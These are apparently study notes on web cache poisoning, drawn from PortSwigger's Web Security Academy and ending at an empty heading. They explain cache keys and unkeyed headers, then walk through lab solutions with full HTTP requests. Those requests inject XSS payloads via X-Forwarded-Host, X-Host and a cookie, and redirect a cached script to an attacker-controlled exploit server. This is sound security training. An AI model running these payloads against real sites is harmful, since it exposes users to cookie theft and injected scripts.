### Web cache poisoning research

This technique was first popularized by our 2018 research paper, "Practical Web Cache Poisoning", and developed further in 2020 with a second research paper, "Web Cache Entanglement: Novel Pathways to Poisoning". If you're interested in a detailed description of how we discovered and exploited these vulnerabilities in the wild, the full write-ups are available on our research page. 
```bash
https://portswigger.net/research/practical-web-cache-poisoning
https://portswigger.net/research/web-cache-entanglement
```

### Cache keys
When the cache receives an HTTP request, it first has to determine whether there is a cached response that it can serve directly, or whether it has to forward the request for handling by the back-end server. Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the "cache key". Typically, this would contain the request line and Host header. Components of the request that are not included in the cache key are said to be "unkeyed"

If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent. As a result, it will serve a copy of the cached response that was generated for the original request. This applies to all subsequent requests with the matching cache key, until the cached response expires.

Crucially, the other components of the request are ignored altogether by the cache. We'll explore the impact of this behavior in more detail later. 

### Constructing a web cache poisoning attack
### Identify and evaluate unkeyed inputs
Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server

You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort

### Param Miner
Fortunately, you can automate the process of identifying unkeyed inputs by adding the Param Miner extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers. If a request containing one of its injected inputs has an effect on the response, Param Miner logs this in Burp, either in the "Issues" pane if you are using Burp Suite Professional, or in the "Output" tab of the extension ("Extensions" > "Installed" > "Param Miner" > "Output") if you are using Burp Suite Community Edition. 

**Caution**: When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request

Cache buster can be e.g.: req query param, Origin header, Cookie, Accept, Accept-encncoding headers

### Elicit a harmful response from the back-end server
Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. 

### Get the response cached
Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.

Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims. 

### Exploiting cache design flaws
### Using web cache poisoning to deliver an XSS attack
Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.

For example, consider the following request and response: 
```bash
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. Crucially for web cache poisoning, the X-Forwarded-Host header is often unkeyed. In this example, the cache can potentially be poisoned with a response containing a simple XSS payload: 
```bash
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
```
If this response was cached, all users who accessed `/en?region=uk` would be served this XSS payload.

### Using web cache poisoning to exploit unsafe handling of resource imports
Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead.

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key. 
```bash
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

### PRACTITIONER Lab: Web cache poisoning with an unkeyed header
The main idea is to find a header that is not included in the cache key, and the value of that header must be reflected in the response on a page that can be cached

We have the request, response of which is stored in the caching server:
```bash
GET / HTTP/2
Host: 0af7001b03b35e6b846c50ff00aa0052.web-security-academy.net
Cookie: session=MRmq8tYlBPTP2VvotLEbcZ7LniTGPZh9
```

In the response we get:
```bash
    <body>
        <script type="text/javascript" src="//0af7001b03b35e6b846c50ff00aa0052.web-security-academy.net/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
            ...
```

Now we need to figure out if we can change the response by adding some additional headers
To do that we can use Param Miner (see above) but before we use param miner it's important to add a cache buster to our requests, because in case of a successful cache poisoning we don't want other users to spot the poisoned cache right away

So we add a cache buster to our request:
```bash
GET /?abc=1234 HTTP/2
Host: 0a63008f037e438485615d08005100ad.web-security-academy.net
```

And we see that the response is cached, which means we can use this cache buster in web cache poisoning tests:
```bash
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10961
```

So to search for headers that can modify the response from the server we'll use Param Miner in burp suite
go to repeater, right click on the request > Extenstions > Param Miner > Guess headers, and leave the default settings for search

Then to see the results of the Param Miner scan we go to Extensions tab in burp > select Param Miner > change the tab within Param Miner extension to Output
In the Output we see:
```
Initiating header bruteforce on 0a0a00c303e00a67806407e0000d0078.web-security-academy.net
Identified parameter on 0a0a00c303e00a67806407e0000d0078.web-security-academy.net: x-forwarded-host~%s.%h
```
So it identified that `x-forwarded-host` header modifies the response from the server

It's important to understand that `x-forwarded-host` header is `unkeyed` by the caching server, i.e. it is not included in the `key` that the cache uses when it decides if it already had the response cached.
The key on the caching server usually consists of url and host.

So we can add `X-Forwarded-Host` header to the request, and its value is reflected in the response html
So if we add `X-Forwarded-Host: VVVVV` to the request, we'll get the following response:
```bash
    <body>
        <script type="text/javascript" src="//VVVVV/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
            ...
```

So we remove the cache buster from the request and add the following header:
```bash
X-Forwarded-Host: "></script><script>alert(document.cookie)</script>
```

And the response is cached by the caching server, but the response also contains our injected js code:
```bash
   <body>
        <script type="text/javascript" src="//"></script><script>alert(document.cookie)</script>/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
            ...
```
So when users visit this page, they'll get the page from the poisoned cache and the js code will be executed

Interesting note: in this particular case the value of `X-Forwarded-Host` header is actually injected into the `<script type="text/javascript" src="/.. ` which means we can change the `src` attribute of the `script` and therefore can make victims to make requests to the server that we control

### Using web cache poisoning to exploit cookie-handling vulnerabilities
Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page:
```bash
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the Cookie header. Let's suppose that the cache key contains the request line and the Host header, but not the Cookie header. In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

This flawed handling of cookies by the cache can also be exploited using web cache poisoning techniques. In practice, however, this vector is relatively rare in comparison to header-based cache poisoning. When cookie-based cache poisoning vulnerabilities exist, they tend to be identified and resolved quickly because legitimate users have accidentally poisoned the cache. 

### PRACTITIONER Lab: Web cache poisoning with an unkeyed cookie
Note: this lab is not described in great details, to understand what's going on here read the description of the `Lab: Web cache poisoning with an unkeyed header`

The main idea is to find a cookie that is not included in the cache key, and the value of that cookie must be reflected in the response on a page that can be cached

A cookie like that can be searched with Param Miner

In the lab the value of cookies aren't included in the cache key. But we know that GET / page is cached and the value of `fehost` Cookie is reflected on that page

When we make a request:
```bash
GET / HTTP/2
Host: labid.web-security-academy.net
Cookie: fehost=VVVV
```

We see the value of `fehost` cookie reflected in the response html:
```bash
       <script>
            data = {"host":"0aa2008d0413718a80350d0a0061004a.web-security-academy.net","path":"/","frontend":"VVVV"}
        </script>
```

We can therefore poison the web cache with the following request:
```bash
GET / HTTP/2
Host: labid.web-security-academy.net
Cookie: fehost="}%3balert(1)%20//
```

And in the response we'll get:
```bash
        <script>
            data = {"host":"labid.web-security-academy.net","path":"/","frontend":""};alert(1) //"}
        </script>
```

Now that response is cached and when other users visit the page, the js code will be executed


### Using multiple headers to exploit web cache poisoning vulnerabilities
Some websites are vulnerable to simple web cache poisoning exploits, as demonstrated above. However, others require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs.

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS: 

```bash
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL

### PRACTITIONER Lab: Web cache poisoning with multiple headers
In this lab the GET /resources/js/tracking.js route is cached

So we first add a cache buster to the request and then we run Param miner to search for headers that may modify the response

Note: the results of Param miner in Extensions > Param miner > Output are appended to the results of the previous scan. Be careful with that and make sure you are reading the results of the last scan

The results of Param miner's last scan:
```bash
Queued 1 attacks from 1 requests in 0 seconds
Initiating header bruteforce on 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net
Identified parameter on 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net: x-forwarded-scheme
Completed attack on 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net
Completed request with key https0a4c000e046d8adf8538b7ad009c001f.web-security-academy.netGET200script: 2 of 2 in 269 seconds with 18412 requests,0 candidates and 0 findings
```

So we see that it found `x-forwarded-scheme` header
So we try to add it to our request:
```bash
GET /resources/js/tracking.js?cb=fsdfsdfsdf HTTP/2
Host: 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net
X-Forwarded-Scheme: nothttps
```
And in the response we get the redirect:
```bash
HTTP/2 302 Found
Location: https://0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net/resources/js/tracking.js?cb=fsdfsdfsdf
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

So we can see that the server returns redirect to `https://...` only when X-Forwarded-Scheme: is not equal to `https`

Now we want to run another Param miner scan. But this time we want to run it together with `X-Forwarded-Scheme: nothttps`
It's important to understand that Param miner only adds 1 header per request that it makes. It never adds 2 or more headers. Therefore we now want to try other headers to be combined with the `X-Forwarded-Scheme: nothttps` header that we found in the first scan, to see if we can find another header, that in combination with `X-Forwarded-Scheme: nothttps` can modify the response further

So the result of the second scan:
```bash
Initiating header bruteforce on 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net
Identified parameter on 0a4c000e046d8adf8538b7ad009c001f.web-security-academy.net: x-forwarded-host~%s.%h
```

So we found `X-Forwarded-host` header modifies the response when combined with `X-Forwarded-host`and we try to use them both:
```bash
GET /resources/js/tracking.js?cb=1234 HTTP/2
Host: 0a41002b03d774ae80b2179300c300f2.web-security-academy.net
X-Forwarded-Host: example.com
X-Forwarded-Scheme: http
```
Response:
```bash
HTTP/2 302 Found
Location: https://example.com/resources/js/tracking.js?cb=1234
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```

As we can see from the response we can manipulate the redirect url.
Important to note that the redirect that we got from the server is cached. Which means we can poison the cache with a redirect to our own server. And later other users will get this cached response (which is a redirect to our own server)

Go to the exploit server (or the server that you control) and create an endpoint that matches `/resources/js/tracking.js`
Pay attention: this is a js file, which means that whatever is contained in that js file, will later be executed by in the browser

So on our exploit server in the response body, we return the response: `alert(document.cookie)`

Now we need to poison the cache. We remove cache buster and modify X-Forwarded-Host header to point to the server that we control
```bash
GET /resources/js/tracking.js HTTP/2
Host: labid.web-security-academy.net
X-Forwarded-Scheme: any
X-Forwarded-Host: exploitserverid.exploit-server.net
```

And in the response we see that the response is cached. So we try to make another request on behalf of a victim user and we should get the redirect returned from the cache, and later our js payload is returned and executed in the browser.

### PRACTITIONER Lab: Targeted web cache poisoning using an unknown header
The origin server returns `Vary: User-agent` header to the caching server (and we later see it in the response because the caching server does not remove the `Vary` header from the response) which means that the origin server asks the caching server to use the value of `User-Agent` header in its cache key

To test that the User-Agent is used in the cache key we can modify the value of User-Agent header and see if the response is returned from the cache or not e.g. by looking into the `X-cache: miss`

So we add cache buster (randomasdfsdf) to User-Agent header and send the request:
```bash
GET / HTTP/1.1
Host: 0a28003904726084843378a7009700ca.h1-web-security-academy.net
Cookie: session=4fixngCBm1ojNle3udbAEmUaiOO8HBbO
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0 randomasdfsdf
```
And in the response we see `X-Cache: miss` which means that it was not returned from the cache and it cached a new response for this User-Agent header that ends with the cache buster. Which proves that the User-Agent header is part of the cache-key.

So we run the Param miner to search for other headers that can change the response from the server.
```bash
Initiating header bruteforce on 0a28003904726084843378a7009700ca.h1-web-security-academy.net
Identified parameter on 0a28003904726084843378a7009700ca.h1-web-security-academy.net: x-host~%h:%s
Identified parameter on 0a28003904726084843378a7009700ca.h1-web-security-academy.net: origin~https://%s.%h
Identified parameter on 0a28003904726084843378a7009700ca.h1-web-security-academy.net: via
```
In the result amongst others we get `x-host` header

So we make a request with `X-Host: VVVV` header and search in the response for `VVVV`
The value of X-host is reflected on the page in the script src tag
```bash
<script type="text/javascript" src="//VVVV/resources/js/tracking.js"></script>
```

So we remove the cache buster from User-Agent header and poison the cache

The victim still doesn't hit the cache, this is because they have a different User-Agent and User-Agent is part of the cache key. Therefore we need to figure out the User-Agent of the victim

it's interesting that we can create a new blog comment on the blog and the html is allowed in the body of the new comment 
We can therefore create a new comment with the following text: `<img src="exploit-server.com" />`and then check `User-Agent` of the victim in the logs on the exploit server

So we now know the User-Agent of the victim so we send a new request with the User-Agent of the victim
```bash
GET / HTTP/1.1
Host: labid-web-security-academy.net
x-host: exploit-id.exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```
And in the response we get:
```bash
X-Cache: miss
...
<script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js"></script>
```
Which means the value from the x-host header (which is exploit-id.exploit-server.net in this case) is reflected in the response. And because of X-Cache: miss we know that the cache is poisoned

And later when the victim makes the request to the `GET /`, they'll get the response from the poisoned cache which includes:
```bash
<script type="text/javascript" src="//exploit-id.exploit-server.net/resources/js/tracking.js"></script>
```
This will make the victim make a request to the exploit server

Lab specific: on the exploit server we need to change the response body to: alert(document.cookie) and the url endpoint (which is called File) to /resources/js/tracking.js

### Using web cache poisoning to exploit DOM-based vulnerabilities


